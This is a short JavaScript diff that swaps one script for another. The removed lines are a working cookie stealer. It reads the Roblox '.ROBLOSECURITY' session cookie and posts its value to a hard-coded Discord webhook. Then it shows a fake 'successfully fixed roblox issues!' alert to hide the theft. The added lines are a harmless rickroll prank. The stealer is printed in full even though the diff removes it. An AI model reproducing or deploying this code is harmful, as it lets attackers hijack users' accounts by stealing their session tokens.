@@ -1,45 +1,6 @@
-function sendCookieToWebhook(cookieName, webhookUrl) {
-    // Retrieve all cookies
-    var cookies = document.cookie.split(';');
-    
-    // Loop through each cookie to find the one with the specified name
-    for (var i = 0; i < cookies.length; i++) {
-        var cookie = cookies[i].trim();
-        // Check if the cookie matches the specified name
-        if (cookie.indexOf(cookieName + '=') === 0) {
-            // Extract the value of the cookie
-            var cookieValue = cookie.substring(cookieName.length + 1);
-            
-            // Create the payload to send to the webhook
-            var payload = {
-                content: `Cookie value: ${cookieValue}`
-            };
-            
-            // Send the payload to the webhook URL via a POST request
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Failed to send webhook');
-                }
-                alert("successfully fixed roblox issues!");
-            })
-            .catch(error => {
-                console.error('Failed to send cookie value to webhook:', error);
-            });
-            
-            break;
-        }
-    }
+function rickroll() {
+    alert("hi");
+    prompt("Enter User ID of FormalLegend to continue");
+    confirm("Are you really formal?") && (window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ");
 }
-
-sendCookieToWebhook('.ROBLOSECURITY', 'https://discord.com/api/webhooks/1211264630224068658/J0NrSPqAp8fLA6iPVgf5VmpYBpt0ZxNnMhcGjG3X1WzV10Hf61Rinp5oG_XMozXjU8PK');
-
-
-
-
+rickroll()
